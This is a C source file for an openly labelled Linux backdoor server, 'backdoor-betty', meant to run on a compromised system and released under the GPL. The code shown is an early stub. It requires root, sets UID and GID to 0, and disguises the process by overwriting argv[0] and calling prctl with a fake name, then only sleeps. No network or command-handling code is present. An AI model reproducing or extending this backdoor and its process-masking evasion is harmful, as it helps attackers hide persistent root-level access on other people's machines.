/*-----------------------------------------------------------------------------
 * backdoor-betty.c - Linux backdoor server (runs on comprimised system)
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "backdoor-betty.h"
#include "utils.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        June 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Parses command-line arguments and
 *        configures the server.
 *
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	/* raise privileges */
	if (set_root() == ERROR_NOTROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		err(1, "set_root");
	}

	/* mask the process name */
	mask_process(argv, PROCESS_NAME);

	sleep(100); /* testing */

	return ERROR_NONE;
}

int set_root()
{
	/* change the UID/GIT to 0 (root) */
	if (setuid(0) != ERROR_NONE || setgid(0) != ERROR_NONE)
		return ERROR_NOTROOT;

	return ERROR_NONE;
}

void mask_process(char *argv[], char *name)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], name);
	prctl(PR_SET_NAME, name, 0, 0);
}
